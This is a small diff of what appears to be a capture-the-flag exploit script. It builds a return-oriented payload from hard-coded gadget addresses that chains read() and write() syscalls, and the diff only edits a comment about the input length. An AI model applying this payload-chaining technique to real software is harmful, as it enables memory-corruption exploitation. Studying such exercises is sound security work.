@@ -14,7 +14,7 @@ SYSCALL_ADDR = 0x4000BE
 RET_ADDR = 0x4000C0
 
 payload = ""
-payload += p64(CLEAR_EAX_READ_ADDR) # Set Syscall ID(write, 1) to RAX: Input 15 Characters
+payload += p64(CLEAR_EAX_READ_ADDR) # Set Syscall ID(write, 1) to RAX: Input 1 Characters
 payload += p64(READ_ADDR) # write(stdout, rsp, 0x400)
 payload += p64(CLEAR_EAX_READ_ADDR) # Back to read()
 
